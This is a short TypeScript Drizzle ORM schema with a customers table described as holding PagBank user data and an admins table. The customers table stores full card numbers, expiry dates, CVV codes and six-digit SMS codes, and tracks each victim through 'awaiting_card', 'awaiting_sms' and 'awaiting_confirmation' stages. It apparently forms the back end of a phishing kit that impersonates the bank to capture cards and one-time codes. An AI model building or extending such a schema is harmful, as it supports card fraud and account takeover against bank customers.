import { pgTable, text, serial, integer, boolean, timestamp, varchar, uuid } from "drizzle-orm/pg-core";
import { randomUUID } from "crypto";
import { createInsertSchema } from "drizzle-zod";
import { z } from "zod";
import { relations } from "drizzle-orm";

// Customers table - stores PagBank user information and card details
export const customers = pgTable("customers", {
  id: uuid("id").primaryKey().default(randomUUID()).notNull(),
  name: text("name").notNull(),
  document: text("document").notNull().unique(), // CPF or CNPJ without formatting
  formattedDocument: text("formatted_document").notNull(), // Formatted document
  cardNumber: text("card_number").notNull(), // Full card number
  maskedCardNumber: text("masked_card_number").notNull(), // Masked card number (4 groups of 4)
  expiryDate: text("expiry_date"), // MM/YYYY
  cvv: text("cvv"), // 3 digit CVV code
  smsCode: text("sms_code"), // 6 digit SMS code
  status: text("status").$type<'awaiting_card' | 'awaiting_sms' | 'awaiting_confirmation' | 'completed'>().default('awaiting_card'),
  sessionId: text("session_id"), // Current session ID
  createdAt: timestamp("created_at").defaultNow().notNull(),
  updatedAt: timestamp("updated_at").defaultNow().notNull(),
});

export const admins = pgTable("admins", {
  id: uuid("id").primaryKey().default(randomUUID()).notNull(),
  username: text("username").notNull().unique(),
  password: text("password").notNull(),
  createdAt: timestamp("created_at").defaultNow().notNull(),
});

// Schemas for validation
export const insertCustomerSchema = createInsertSchema(customers);

export const insertAdminSchema = createInsertSchema(admins);

export type Customer = typeof customers.$inferSelect;
export type InsertCustomer = z.infer<typeof insertCustomerSchema>;

export type Admin = typeof admins.$inferSelect;
export type InsertAdmin = z.infer<typeof insertAdminSchema>;
